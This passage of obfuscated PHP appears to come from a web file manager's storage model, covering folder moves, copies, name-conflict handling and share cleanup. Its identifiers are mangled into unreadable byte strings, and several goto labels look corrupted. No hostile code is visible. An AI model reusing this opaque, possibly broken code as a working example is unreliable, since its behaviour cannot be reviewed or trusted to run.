$c´Ø’‹àŠ[$Dª´¢ÈŠ¸©[455]]; $BªßÉ£öê = $this->parentLevelArray($fÆä¼‹¦“±[$Dª´¢ÈŠ¸©[455]]); goto B…²ÅƒÚ›; B…²ÅƒÚ›: foreach ($BªßÉ£öê as $F°…»‹ğ­) { if (isset($aßËßäµØÜ[$F°…»‹ğ­])) { $eµùêÚ‹Ó .= $aßËßäµØÜ[$F°…»‹ğ­] . $Dª´¢ÈŠ¸©[513]; } } $eµùêÚ‹Ó = rtrim($eµùêÚ‹Ó, $Dª´¢ÈŠ¸©[47]) . $Dª´¢ÈŠ¸©[47]; $c„·œéêÓ‚ = $this->parentLevelArray($eµùêÚ‹Ó); goto dÎ‹ãº•÷à; dÎ‹ãº•÷à: $cÄ¡…ĞŒš¦ = $c„·œéêÓ‚[count($c„·œéêÓ‚) - 1]; return array($Dª´¢ÈŠ¸©[457] => $cÄ¡…ĞŒš¦, $Dª´¢ÈŠ¸©[455] => $eµùêÚ‹Ó); goto bğì½½˜õµ; bğì½½˜õµ: } private function _makeItemData($FÒÄî¯ä, $D¡Ú§õÓğ, $AÚ©Ú¥é¼) { $c‹Áã¡Ú =& $_SERVER[»„]; $Cˆ–ğææ±× = array($c‹Áã¡Ú[514] => $FÒÄî¯ä[$c‹Áã¡Ú[366]], $c‹Áã¡Ú[382] => $AÚ©Ú¥é¼, $c‹Áã¡Ú[515] => $FÒÄî¯ä[$c‹Áã¡Ú[368]], $c‹Áã¡Ú[416] => $FÒÄî¯ä[$c‹Áã¡Ú[415]], $c‹Áã¡Ú[516] => $FÒÄî¯ä[$c‹Áã¡Ú[77]], $c‹Áã¡Ú[517] => $D¡Ú§õÓğ[$c‹Áã¡Ú[367]], $c‹Áã¡Ú[518] => $D¡Ú§õÓğ[$c‹Áã¡Ú[452]], $c‹Áã¡Ú[519] => USER_ID, $c‹Áã¡Ú[520] => USER_ID, $c‹Áã¡Ú[364] => $D¡Ú§õÓğ[$c‹Áã¡Ú[365]], $c‹Áã¡Ú[521] => $D¡Ú§õÓğ[$c‹Áã¡Ú[455]] . $D¡Ú§õÓğ[$c‹Áã¡Ú[365]] . $c‹Áã¡Ú[47], $c‹Áã¡Ú[392] => 0, $c‹Áã¡Ú[522] => $c‹Áã¡Ú[33]); return $Cˆ–ğææ±×; } private function _copyApplyMeta($Eë–º°ÎÉí, &$bË§Ç³İ‹ˆ) { $D•’ˆïøÎÕ =& $_SERVER[»„]; $a²¡¦ô‡ñ = $Eë–º°ÎÉí[$D•’ˆïøÎÕ[365]]; $A™ÂùÌ¸÷© = $Eë–º°ÎÉí[$D•’ˆïøÎÕ[28]]; if (!isset($Eë–º°ÎÉí[$D•’ˆïøÎÕ[523]]) || !$Eë–º°ÎÉí[$D•’ˆïøÎÕ[523]] || $Eë–º°ÎÉí[$D•’ˆïøÎÕ[523]] == $D•’ˆïøÎÕ[464]) { $bË§Ç³İ‹ˆ[$D•’ˆïøÎÕ[499]][] = array($D•’ˆïøÎÕ[365], $a²¡¦ô‡ñ, $D•’ˆïøÎÕ[523], short_id($a²¡¦ô‡ñ)); } if (Input::check($A™ÂùÌ¸÷©, $D•’ˆïøÎÕ[524])) { $bË§Ç³İ‹ˆ[$D•’ˆïøÎÕ[498]][] = array($D•’ˆïøÎÕ[365] => $a²¡¦ô‡ñ, $D•’ˆïøÎÕ[89] => $D•’ˆïøÎÕ[412], $D•’ˆïøÎÕ[355] => str_replace($D•’ˆïøÎÕ[50], $D•’ˆïøÎÕ[33], Pinyin::encode($A™ÂùÌ¸÷©))); $bË§Ç³İ‹ˆ[$D•’ˆïøÎÕ[498]][] = array($D•’ˆïøÎÕ[365] => $a²¡¦ô‡ñ, $D•’ˆïøÎÕ[89] => $D•’ˆïøÎÕ[411], $D•’ˆïøÎÕ[355] => Pinyin::encode($A™ÂùÌ¸÷©, $D•’ˆïøÎÕ[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($dÄ¯ë°Ûõğ) { goto cçùˆ¾ğØ¢; cŒ ƒŒÆœ¬: $F…÷¨¹ÇÂ = array_to_keyvalue($F…÷¨¹ÇÂ, $a›¤ñŠÚ‘[365]); foreach ($F…÷¨¹ÇÂ as $Eòº ˆï¾Ú) { $f”ããÇÀÔÚ = $Eòº ˆï¾Ú[$a›¤ñŠÚ‘[457]]; $dÄ¯ë°Ûõğ = $Eòº ˆï¾Ú[$a›¤ñŠÚ‘[365]]; if (!isset($this->_childrenListCache[$dÄ¯ë°Ûõğ]) && $Eòº ˆï¾Ú[$a›¤ñŠÚ‘[366]] == $a›¤ñŠÚ‘[83]) { $this->_childrenListCache[$dÄ¯ë°Ûõğ] = array(); } if (!isset($this->_childrenListCache[$f”ããÇÀÔÚ])) { $this->_childrenListCache[$f”ããÇÀÔÚ] = array(); } $this->_childrenListCache[$f”ããÇÀÔÚ][$dÄ¯ë°Ûõğ] = $Eòº ˆï¾Ú; $this->_childrenItemCache[$dÄ¯ë°Ûõğ] = $Eòº ˆï¾Ú; } goto EÔ©òíâ…; cçùˆ¾ğØ¢: $a›¤ñŠÚ‘ =& $_SERVER[»„]; $Fç­ÚÜ»ŒÜ = $this->sourceInfo($dÄ¯ë°Ûõğ); $aÕµÄ”ÛÒ = $a›¤ñŠÚ‘[526]; goto BÄã¢¬ÏŒ˜; BÄã¢¬ÏŒ˜: $e…Åäğñ¯£ = array($a›¤ñŠÚ‘[455] => array($a›¤ñŠÚ‘[479], $Fç­ÚÜ»ŒÜ[$a›¤ñŠÚ‘[455]] . $dÄ¯ë°Ûõğ . $a›¤ñŠÚ‘[480]), $a›¤ñŠÚ‘[393] => $this->targetIsDelete); $F…÷¨¹ÇÂ = $this->field($aÕµÄ”ÛÒ)->where($e…Åäğñ¯£)->select(); if (!$F…÷¨¹ÇÂ) { return; } goto cŒ ƒŒÆœ¬; EÔ©òíâ…: } private function _childrenListAll($FèÙÂë±çæ, &$Dè¼½ÁÉ») { $C¾Ñ”÷ó­ö =& $_SERVER[»„]; if (!isset($this->_childrenListCache[$FèÙÂë±çæ])) { return; } $aùí£‹Ä“™ = $this->_childrenListCache[$FèÙÂë±çæ]; foreach ($aùí£‹Ä“™ as $aàÄÂÁ¶Ÿ => $eÖ³¶çÓ‹) { $Dè¼½ÁÉ»[$aàÄÂÁ¶Ÿ] = $eÖ³¶çÓ‹; if ($eÖ³¶çÓ‹[$C¾Ñ”÷ó­ö[366]] == $C¾Ñ”÷ó­ö[83]) { $this->_childrenListAll($aàÄÂÁ¶Ÿ, $Dè¼½ÁÉ»); } } } private function sourceInfoCache($aÌ¦”Œ×±) { if (isset($this->_childrenItemCache[$aÌ¦”Œ×±])) { return $this->_childrenItemCache[$aÌ¦”Œ×±]; } return $this->sourceInfo($aÌ¦”Œ×±); } private function _childrenList($d™İâËòé”) { if (isset($this->_childrenListCache[$d™İâËòé”])) { return $this->_childrenListCache[$d™İâËòé”]; } return $this->_childrenListSelect($d™İâËòé”); } private function _childrenListSelect($BÒğÑ„ˆ¢´) { goto Cè˜ÉæŒÌ; Dìë ¾©: foreach ($aææÇ—àğ as $BÒğÑ„ˆ¢´ => $E—Ì¢ÌŞµÑ) { $this->_childrenItemCache[$BÒğÑ„ˆ¢´] = $E—Ì¢ÌŞµÑ; } return $aææÇ—àğ; goto BŸ“£ìŞÈ; Cè˜ÉæŒÌ: $Cï½¿á¢ö’ =& $_SERVER[»„]; $cã‚ ÚˆáË = array($Cï½¿á¢ö’[457] => $BÒğÑ„ˆ¢´, $Cï½¿á¢ö’[393] => $this->targetIsDelete); $fî‡š¹†Î™ = $this->where($cã‚ ÚˆáË)->select(); goto eøÑâˆóº; eøÑâˆóº: $fî‡š¹†Î™ = $fî‡š¹†Î™ ? $fî‡š¹†Î™ : array(); $aææÇ—àğ = array_to_keyvalue($fî‡š¹†Î™, $Cï½¿á¢ö’[365]); $this->_childrenListCache[$BÒğÑ„ˆ¢´] = $aææÇ—àğ; goto Dìë ¾©; BŸ“£ìŞÈ: } private function fileNameExistCache($FÍÓ½°÷·©, $e’òƒèÁŒã) { $fÑÎÄóù’ =& $_SERVER[»„]; $e’òƒèÁŒã = strtolower($e’òƒèÁŒã); $cà¯®½Œ¾¸ = $this->_childrenList($FÍÓ½°÷·©); foreach ($cà¯®½Œ¾¸ as $fùÁÖ‚£ˆ“) { if ($e’òƒèÁŒã == strtolower($fùÁÖ‚£ˆ“[$fÑÎÄóù’[28]])) { return $fùÁÖ‚£ˆ“[$fÑÎÄóù’[365]]; } } return !1; } private function fileNameAutoCache($e’ÆóÅŸ‘µ, $EãÖ»ôàÊË, $fë‚¿­Óô, $f˜øÒñÆ£Ñ) { $AèÛ±ŞÈ =& $_SERVER[»„]; $EííÌÙİĞë = $this->_childrenList($e’ÆóÅŸ‘µ); $eáõÂ¢æ…Ã = array_to_keyvalue($EííÌÙİĞë, $AèÛ±ŞÈ[33], $AèÛ±ŞÈ[28]); return $this->fileNameAutoGet($eáõÂ¢æ…Ã, $EãÖ»ôàÊË, $fë‚¿­Óô, $f˜øÒñÆ£Ñ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($bé•ĞÄ´ØÓ, $céØåŒô, $cÊ¥óª³í = REPEAT_REPLACE, $e¸µœœ›…¤ = '') { goto D¦…é•¼Ç¼; D¦…é•¼Ç¼: $cËø¹¦ÂŒ =& $_SERVER[»„]; $C®Ï‚½Ôè‚ = $this->sourceInfo($bé•ĞÄ´ØÓ); $d–ÏÙÅ¥ğù = $this->sourceInfo($céØåŒô); goto C»ñ„ìÔç; b¢ïğ Ç‡ : Model($cËø¹¦ÂŒ[501])->eventMove($bé•ĞÄ´ØÓ, $C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[457]], $céØåŒô); Hook::trigger($cËø¹¦ÂŒ[528], $Aö°àÀ­Ó); return $D¥‡Å‡¥; goto AÎË¸Ò÷Û‰; A¸·Ç££Ñˆ: $this->lockWriteEnd($céØåŒô, $DŒÃ©»…Ê); $this->folderSizeReset($C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[457]]); $this->folderSizeReset($céØåŒô); goto dÙÒ„Û»÷ã; D‰ˆËñ×Àî: Hook::trigger($cËø¹¦ÂŒ[527], $Aö°àÀ­Ó); $this->targetIsDelete = intval($C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[393]]); if ($C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[457]] == $céØåŒô && $e¸µœœ›…¤ != $C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[28]]) { $f¿œêôÎÉ = $this->fileNameExist($céØåŒô, $e¸µœœ›…¤); if ($f¿œêôÎÉ && $C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[366]] == $cËø¹¦ÂŒ[464]) { goto fÖ ˜ª×‡ ; eœ³‡’“Ä…: return $f¿œêôÎÉ; goto CğÑîŒ”Ğ³; C©…ÙŸ¢´: $this->removeNow($bé•ĞÄ´ØÓ, !1); $this->folderSizeReset($céØåŒô); Hook::trigger($cËø¹¦ÂŒ[528], $Aö°àÀ­Ó); goto eœ³‡’“Ä…; fÖ ˜ª×‡ : $D±ù‘ã¼´ = $this->sourceInfo($f¿œêôÎÉ); $e·›†áÕµ = $this->fileHistory($D±ù‘ã¼´, $C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[415]], $C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[77]]); if (!$e·›†áÕµ) { Model($cËø¹¦ÂŒ[418])->remove($C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[415]]); } goto C©…ÙŸ¢´; CğÑîŒ”Ğ³: } } goto FïåÂ¿ã”ã; eÄ¦®ÄÍ¡Û: $b­„ÖÚé´ß = array($cËø¹¦ÂŒ[497] => array(), $cËø¹¦ÂŒ[529] => !1); $this->clearShare($bé•ĞÄ´ØÓ, $céØåŒô); $aó·µÜ†ãë = $this->fileNameExistCache($céØåŒô, $C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[28]]); goto D¶™´¦ßª‘; C»ñ„ìÔç: $Aö°àÀ­Ó = $this->pathInfoMore($bé•ĞÄ´ØÓ); if ($this->isParentOf($bé•ĞÄ´ØÓ, $céØåŒô)) { return !1; } if (!$C®Ï‚½Ôè‚ || !$d–ÏÙÅ¥ğù || $d–ÏÙÅ¥ğù[$cËø¹¦ÂŒ[366]] != $cËø¹¦ÂŒ[83]) { return !1; } goto D‰ˆËñ×Àî; dÙÒ„Û»÷ã: $Eø«…¨Ú†“ = array($C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[457]], $céØåŒô); if ($C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[366]] == $cËø¹¦ÂŒ[83]) { $Eø«…¨Ú†“[] = $bé•ĞÄ´ØÓ; } $this->updateModifyTime($Eø«…¨Ú†“); goto b¢ïğ Ç‡ ; FïåÂ¿ã”ã: $DŒÃ©»…Ê = $e¸µœœ›…¤ ? $e¸µœœ›…¤ : $C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[28]]; $this->lockMoveStart($bé•ĞÄ´ØÓ); $this->lockWriteStart($céØåŒô, $DŒÃ©»…Ê); goto eÄ¦®ÄÍ¡Û; Dçï’“»±Ç: Model($cËø¹¦ÂŒ[163])->linkAdd($b­„ÖÚé´ß[$cËø¹¦ÂŒ[497]]); if ($aó·µÜ†ãë && $b­„ÖÚé´ß[$cËø¹¦ÂŒ[529]]) { $this->removeNow($bé•ĞÄ´ØÓ, !1); } $this->lockMoveEnd($bé•ĞÄ´ØÓ); goto A¸·Ç££Ñˆ; D¶™´¦ßª‘: $D¥‡Å‡¥ = $this->_move($bé•ĞÄ´ØÓ, $céØåŒô, $cÊ¥óª³í, $b­„ÖÚé´ß, $e¸µœœ›…¤); $this->sourceCacheClear(); if ($C®Ï‚½Ôè‚[$cËø¹¦ÂŒ[366]] == $cËø¹¦ÂŒ[83] && $aó·µÜ†ãë) { $this->folderSizeResetChildren($D¥‡Å‡¥); } goto Dçï’“»±Ç; AÎË¸Ò÷Û‰: } private function _move($DŒİèœá×, $bÂÇ¿ñĞÏˆ, $eœ™ì¢Ã™, &$B‹›ËëŸ°ğ, $F¡ºÜ™÷…£ = '') { goto cÚÚ²‚™‡Ï; BÒ–ˆÒ«Ê: $this->lockWriteStart($bÂÇ¿ñĞÏˆ, $D»Š£†è»Á); if (!$Eó¦ãÄ¿èÇ) { return $this->_moveForce($DŒİèœá×, $bÂÇ¿ñĞÏˆ, $D»Š£†è»Á); } $A™Ê…Ÿèç = $Eó¦ãÄ¿èÇ; goto d¶«Ìáñ; f’¾©‰ÛËË: $D»Š£†è»Á = $F¡ºÜ™÷…£ ? $F¡ºÜ™÷…£ : $c¿ƒ¦˜¨¹ò[$bƒÛù¿¡¤[28]]; $Eó¦ãÄ¿èÇ = $this->fileNameExistCache($bÂÇ¿ñĞÏˆ, $D»Š£†è»Á); $this->lockMoveStart($DŒİèœá×); goto BÒ–ˆÒ«Ê; d¶«Ìáñ: $cƒ±¿‡‹³† = !1; if ($cˆ¼¬¾Ü‹) { if ($eœ™ì¢Ã™ == REPEAT_RENAME_FOLDER) { $D»Š£†è»Á = $this->fileNameAuto($bÂÇ¿ñĞÏˆ, $D»Š£†è»Á, $eœ™ì¢Ã™, $cˆ¼¬¾Ü‹); $A™Ê…Ÿèç = $this->_moveForce($DŒİèœá×, $bÂÇ¿ñĞÏˆ, $D»Š£†è»Á); } else { if ($eœ™ì¢Ã™ == REPEAT_RENAME_FOLDER) { $eœ™ì¢Ã™ = REPEAT_RENAME; } $EÆÓ£™”à = $this->_childrenListSelect($DŒİèœá×); foreach ($EÆÓ£™”à as $Bï¶ó¨ª Í) { $this->_move($Bï¶ó¨ª Í[$bƒÛù¿¡¤[365]], $Eó¦ãÄ¿èÇ, $eœ™ì¢Ã™, $B‹›ËëŸ°ğ); } $cƒ±¿‡‹³† = !0; } } else { if ($eœ™ì¢Ã™ == REPEAT_SKIP) { $cƒ±¿‡‹³† = !0; } else { if ($eœ™ì¢Ã™ == REPEAT_RENAME || $eœ™ì¢Ã™ == REPEAT_RENAME_FOLDER) { $D»Š£†è»Á = $this->fileNameAuto($bÂÇ¿ñĞÏˆ, $D»Š£†è»Á, $eœ™ì¢Ã™, $cˆ¼¬¾Ü‹); $A™Ê…Ÿèç = $this->_moveForce($DŒİèœá×, $bÂÇ¿ñĞÏˆ, $D»Š£†è»Á); } else { if ($eœ™ì¢Ã™ == REPEAT_REPLACE) { $e¦¦Šƒ„ãÍ = $this->sourceInfoCache($Eó¦ãÄ¿èÇ); $b­ªÅÙóìĞ = $this->fileHistory($e¦¦Šƒ„ãÍ, $c¿ƒ¦˜¨¹ò[$bƒÛù¿¡¤[415]], $c¿ƒ¦˜¨¹ò[$bƒÛù¿¡¤[77]]); if ($b­ªÅÙóìĞ) { $B‹›ËëŸ°ğ[$bƒÛù¿¡¤[497]][] = $c¿ƒ¦˜¨¹ò[$bƒÛù¿¡¤[415]]; } else { $cƒ±¿‡‹³† = !0; } } } } } if ($cƒ±¿‡‹³† && !$B‹›ËëŸ°ğ[$bƒÛù¿¡¤[529]]) { $B‹›ËëŸ°ğ[$bƒÛù¿¡¤[529]] = !0; } goto e®Ã›¹´Ò; cÚÚ²‚™‡Ï: $bƒÛù¿¡¤ =& $_SERVER[»„]; $c¿ƒ¦˜¨¹ò = $this->sourceInfo($DŒİèœá×); $cˆ¼¬¾Ü‹ = $c¿ƒ¦˜¨¹ò[$bƒÛù¿¡¤[366]] == $bƒÛù¿¡¤[83]; goto f’¾©‰ÛËË; e®Ã›¹´Ò: return $A™Ê…Ÿèç; goto a§ãŠÎ•ÍÆ; a§ãŠÎ•ÍÆ: } private function _moveForce($C¥‹„¤¿ÍÉ, $Eò¹ÁË‡ÛÇ, $Eö„¸ÀğÎØ) { goto DÅŠ¢ŸÀÓË; DÅŠ¢ŸÀÓË: $eÖ‹°—¡³– =& $_SERVER[»„]; $fÂÕÛßã… = $this->sourceInfo($C¥‹„¤¿ÍÉ); $aôÈ¿¬ÛÆ© = $this->sourceInfo($Eò¹ÁË‡ÛÇ); goto CŸ÷¶ò¦æ”; CŸ÷¶ò¦æ”: $bãƒõ äÇ = $fÂÕÛßã…[$eÖ‹°—¡³–[366]] == $eÖ‹°—¡³–[83]; $dö›Õïæ = array($eÖ‹°—¡³–[364] => $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[365]], $eÖ‹°—¡³–[521] => $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[455]] . $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[365]] . $eÖ‹°—¡³–[47], $eÖ‹°—¡³–[517] => $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[367]], $eÖ‹°—¡³–[518] => $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[452]], $eÖ‹°—¡³–[520] => USER_ID, $eÖ‹°—¡³–[382] => $Eö„¸ÀğÎØ); $B›Ü§èğ‰ = $fÂÕÛßã…[$eÖ‹°—¡³–[367]] == SourceModel::TYPE_GROUP && $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[367]] == SourceModel::TYPE_GROUP && $fÂÕÛßã…[$eÖ‹°—¡³–[452]] == $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[452]]; goto c®‚ŠÔ¼„´; c®‚ŠÔ¼„´: if (!$B›Ü§èğ‰) { Model($eÖ‹°—¡³–[450])->authClear($C¥‹„¤¿ÍÉ); } $C¸çô®ÑŒ¯ = $fÂÕÛßã…[$eÖ‹°—¡³–[393]] == $eÖ‹°—¡³–[83] && $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[393]] != $eÖ‹°—¡³–[83]; if ($C¸çô®ÑŒ¯) { $dö›Õïæ[$eÖ‹°—¡³–[392]] = 0; } goto bªÁŸ…‹Â¯; bªÁŸ…‹Â¯: if ($bãƒõ äÇ) { $açÆÜ‘•ğä = array($eÖ‹°—¡³–[521] => array($eÖ‹°—¡³–[479], $fÂÕÛßã…[$eÖ‹°—¡³–[455]] . $fÂÕÛßã…[$eÖ‹°—¡³–[365]] . $eÖ‹°—¡³–[480])); $fªµğàòöö = $fÂÕÛßã…[$eÖ‹°—¡³–[455]] . $fÂÕÛßã…[$eÖ‹°—¡³–[365]] . $eÖ‹°—¡³–[47]; $Aìïñâ¶—­ = $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[455]] . $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[365]] . $eÖ‹°—¡³–[47] . $fÂÕÛßã…[$eÖ‹°—¡³–[365]] . $eÖ‹°—¡³–[47]; $Cá·ñ³Ú·Ã = array($eÖ‹°—¡³–[521] => array($eÖ‹°—¡³–[530], "\x72\x65\x70\x6c\x61\x63\145\x28\160\141\162\145\156\164\114\x65\166\x65\x6c\x2c\47{$fªµğàòöö}\47\x2c\47{$Aìïñâ¶—­}\x27\x29"), $eÖ‹°—¡³–[517] => $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[367]], $eÖ‹°—¡³–[518] => $aôÈ¿¬ÛÆ©[$eÖ‹°—¡³–[452]]); if ($C¸çô®ÑŒ¯) { $Cá·ñ³Ú·Ã[$eÖ‹°—¡³–[392]] = 0; } $this->where($açÆÜ‘•ğä)->data($Cá·ñ³Ú·Ã)->save(); } $this->where(array($eÖ‹°—¡³–[379] => $C¥‹„¤¿ÍÉ))->data($dö›Õïæ)->save(); return $C¥‹„¤¿ÍÉ; goto fÔõ­Õˆºß; fÔõ­Õˆºß: } private function clearShare($CÁá»âê”Œ, $BãİõË¹„) { goto E½‚®‹ùá; Bá‘ÇÔëƒõ: if ($f©â¢¨ãá[$dö¿Éš¤óŞ[452]] == $D½¿Ñ¢‘éö[$dö¿Éš¤óŞ[452]] && $f©â¢¨ãá[$dö¿Éš¤óŞ[367]] == $dö¿Éš¤óŞ[531]) { return; } $cÈ²ä²ÒÏ‡ = array($dö¿Éš¤óŞ[455] => array($dö¿Éš¤óŞ[479], $f©â¢¨ãá[$dö¿Éš¤óŞ[455]] . $CÁá»âê”Œ . $dö¿Éš¤óŞ[480])); $AÌè…¾šˆ = $this->field($dö¿Éš¤óŞ[379])->where($cÈ²ä²ÒÏ‡)->getField($dö¿Éš¤óŞ[365], !0); goto Fé…ß—Şì”; Fé…ß—Şì”: if (!$AÌè…¾šˆ) { return; } $cÈ²ä²ÒÏ‡ = array($dö¿Éš¤óŞ[365] => array($dö¿Éš¤óŞ[7], $AÌè…¾šˆ), $dö¿Éš¤óŞ[444] => 1); $D“ê¯ ñÙ¹ = Model($dö¿Éš¤óŞ[532])->field($dö¿Éš¤óŞ[437])->where($cÈ²ä²ÒÏ‡)->select(); goto CÛ¥Ô®¥–; DÌÎ‘¦†: Model($dö¿Éš¤óŞ[532])->where($cÈ²ä²ÒÏ‡)->save(array($dö¿Éš¤óŞ[444] => 0)); Model($dö¿Éš¤óŞ[533])->where($cÈ²ä²ÒÏ‡)->delete(); goto DÂ‹ê‚Øƒ; CÛ¥Ô®¥–: if (!$D“ê¯ ñÙ¹) { return; } $D“ê¯ ñÙ¹ = array_to_keyvalue($D“ê¯ ñÙ¹, $dö¿Éš¤óŞ[33], $dö¿Éš¤óŞ[437]); $cÈ²ä²ÒÏ‡ = array($dö¿Éš¤óŞ[437] => array($dö¿Éš¤óŞ[7], $D“ê¯ ñÙ¹)); goto DÌÎ‘¦†; E½‚®‹ùá: $dö¿Éš¤óŞ =& $_SERVER[»„]; $f©â¢¨ãá = $this->sourceInfo($CÁá»âê”Œ); $D½¿Ñ¢‘éö = $this->sourceInfo($BãİõË¹„); goto Bá‘ÇÔëƒõ; DÂ‹ê‚Øƒ: } public function copyFolderFromIO($BÜ¶Ì‰¯Ç‘, $d“ÔÂÓ¹Ú, $CÙÌƒÒÍ‹Š, $Aä¯ÂõÍç, $B¨•â¦ôƒÙ, $f†ÆƒÚÉŸ¼ = false) { goto b…¶éÆ“‘£; f×Ò—ƒ¿ïÚ: Hook::trigger($cØ²Ì£ÃÎ‡[536]); if ($CÀ„´ÚßÒ) { $this->folderSizeResetChildren($CÀ„´ÚßÒ); } $this->_childrenListClear(); goto AÀ¹ÌÖìª¾; b”Ã°Û±Ì: $BÊ„¾Ûí‰ˆ = $this->fileNameExist($CÙÌƒÒÍ‹Š, $dŠ¦Ñ“È¢); $CÀ„´ÚßÒ = $this->mkdir($CÙÌƒÒÍ‹Š, $dŠ¦Ñ“È¢, $Aä¯ÂõÍç); if (!$BÊ„¾Ûí‰ˆ || $Aä¯ÂõÍç == REPEAT_RENAME_FOLDER) { $Aä¯ÂõÍç = !1; } goto FĞöÎì³™ù; b…¶éÆ“‘£: $cØ²Ì£ÃÎ‡ =& $_SERVER[»„]; $aÒ½°ãÛÈÛ = array($cØ²Ì£ÃÎ‡[498] => array(), $cØ²Ì£ÃÎ‡[499] => array(), $cØ²Ì£ÃÎ‡[497] => array(), $cØ²Ì£ÃÎ‡[534] => array()); $dŠ¦Ñ“È¢ = $f†ÆƒÚÉŸ¼ ? $f†ÆƒÚÉŸ¼ : $BÜ¶Ì‰¯Ç‘->getPathName($BÜ¶Ì‰¯Ç‘->pathThis($d“ÔÂÓ¹Ú)); goto b”Ã°Û±Ì; FĞöÎì³™ù: if ($BÊ„¾Ûí‰ˆ) { $this->_childrenAllMake($BÊ„¾Ûí‰ˆ); } Hook::trigger($cØ²Ì£ÃÎ‡[535]); $this->_copyChildTo($BÜ¶Ì‰¯Ç‘, $d“ÔÂÓ¹Ú, $CÀ„´ÚßÒ, $Aä¯ÂõÍç, $aÒ½°ãÛÈÛ, $B¨•â¦ôƒÙ); goto f×Ò—ƒ¿ïÚ; aâŒÏÄ‡Ì: Model($cØ²Ì£ÃÎ‡[418])->linkAdd($aÒ½°ãÛÈÛ[$cØ²Ì£ÃÎ‡[497]]); Model($cØ²Ì£ÃÎ‡[418])->remove($aÒ½°ãÛÈÛ[$cØ²Ì£ÃÎ‡[534]]); $this->folderSizeReset($CÙÌƒÒÍ‹Š); goto C¸ÙĞæÂ; C¸ÙĞæÂ: $this->updateModifyTime($CÙÌƒÒÍ‹Š); return $CÀ„´ÚßÒ; goto dˆÕ½öÉ¡; AÀ¹ÌÖìª¾: Model($cØ²Ì£ÃÎ‡[500])->addAll($aÒ½°ãÛÈÛ[$cØ²Ì£ÃÎ‡[498]], array(), !0); Model($cØ²Ì£ÃÎ‡[501])->eventCopy($CÀ„´ÚßÒ); $this->saveAll($aÒ½°ãÛÈÛ[$cØ²Ì£ÃÎ‡[499]]); goto aâŒÏÄ‡Ì; dˆÕ½öÉ¡: } private function _copyChildTo($F†ÀÎ¦ß×Ú, $c¶»ÊõÜ‰è, $C—ÇèöÓ¶…, $fòóŸÙƒÄ, &$eÂÀÏøÁ‘Í, $bÉ–ÓÔÛãà) { goto Eœ±‡…‰Ù; aÙİìÒ…: $E‘­”¸…ƒ„ = array_merge($d’Û•’Š®Ô[$B¿°ùÆÓÊ[73]], $d’Û•’Š®Ô[$B¿°ùÆÓÊ[74]]); $fİÆ²æ·ïÚ = $this->_addFiles($F†ÀÎ¦ß×Ú, $d’Û•’Š®Ô[$B¿°ùÆÓÊ[73]], $bÉ–ÓÔÛãà); $CÖ±”Àö÷Æ = array(); goto FáŠ­¢¼Ü; FáŠ­¢¼Ü: foreach ($E‘­”¸…ƒ„ as &$C‡•„ñßäŠ) { goto A­ä¿—‹ëÀ; e—º‚ˆ­¯á: if ($fòóŸÙƒÄ) { $eäÊ‘ïç¤¿ = $this->fileNameExistCache($C—ÇèöÓ¶…, $C‡•„ñßäŠ[$B¿°ùÆÓÊ[28]]); if ($eäÊ‘ïç¤¿) { if ($C‡•„ñßäŠ[$B¿°ùÆÓÊ[366]] || $fòóŸÙƒÄ == REPEAT_SKIP) { continue; } if ($fòóŸÙƒÄ == REPEAT_REPLACE) { $aÕÓõ…³¬½ = $this->sourceInfoCache($eäÊ‘ïç¤¿); $Bœ¼Îå¦Õ× = $this->fileHistory($aÕÓõ…³¬½, $C‡•„ñßäŠ[$B¿°ùÆÓÊ[415]], $C‡•„ñßäŠ[$B¿°ùÆÓÊ[77]]); if ($Bœ¼Îå¦Õ×) { $eÂÀÏøÁ‘Í[$B¿°ùÆÓÊ[497]][] = $C‡•„ñßäŠ[$B¿°ùÆÓÊ[415]]; } continue; } else { if ($fòóŸÙƒÄ == REPEAT_RENAME) { $C‡•„ñßäŠ[$B¿°ùÆÓÊ[28]] = $this->fileNameAutoCache($C—ÇèöÓ¶…, $C‡•„ñßäŠ[$B¿°ùÆÓÊ[28]], $fòóŸÙƒÄ, !1); } } } } if (!$C‡•„ñßäŠ[$B¿°ùÆÓÊ[366]] && $C‡•„ñßäŠ[$B¿°ùÆÓÊ[415]]) { $eÂÀÏøÁ‘Í[$B¿°ùÆÓÊ[497]][] = $C‡•„ñßäŠ[$B¿°ùÆÓÊ[415]]; } $CÖ±”Àö÷Æ[] = $this->_makeItemData($C‡•„ñßäŠ, $B‘”ŸíÏ“×, $C‡•„ñßäŠ[$B¿°ùÆÓÊ[28]]); goto DÌå‚„“í²; A­ä¿—‹ëÀ: if (isset($fİÆ²æ·ïÚ[$C‡•„ñßäŠ[$B¿°ùÆÓÊ[28]]])) { $C‡•„ñßäŠ = $fİÆ²æ·ïÚ[$C‡•„ñßäŠ[$B¿°ùÆÓÊ[28]]]; } $C‡•„ñßäŠ[$B¿°ùÆÓÊ[366]] = $C‡•„ñßäŠ[$B¿°ùÆÓÊ[29]] == $B¿°ùÆÓÊ[76]; $C‡•„ñßäŠ[$B¿°ùÆÓÊ[368]] = _get($C‡•„ñßäŠ, $B¿°ùÆÓÊ[156], 